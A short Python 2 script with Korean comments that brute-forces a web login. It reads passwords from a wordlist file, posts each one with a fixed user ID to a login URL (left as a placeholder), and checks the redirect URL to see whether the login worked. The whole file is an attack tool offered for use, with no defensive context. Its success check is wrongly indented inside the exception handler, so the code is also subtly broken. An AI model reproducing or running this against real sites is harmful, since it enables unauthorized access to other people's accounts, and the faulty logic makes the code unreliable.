import urllib
import urllib2

#아이디비번 받자!
url =""
id = "아이디"
table = open('비밀번호테이블.txt', 'r')
pwd = table.readlines()

#테이블에 있는거 무차별대입 합니다요
for password in pwd:
    password = password.strip()

    values = {'html태그에서 아이디부분':id, "비번":password}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data)
    response = urllib2.urlopen(request)

    try:
        idx = response.geturl().index('로그인 되고나서 url에 포함될 주소')# 로그인이 정상적으로 된건지 확인
    except:
        idx = 0

        if(idx > 0):
            print("==== 로그인 성공 ====["+password+"]")
            break
        else:
            print("==== 로그인 실패 ==== ["+password+"]")
table.close()



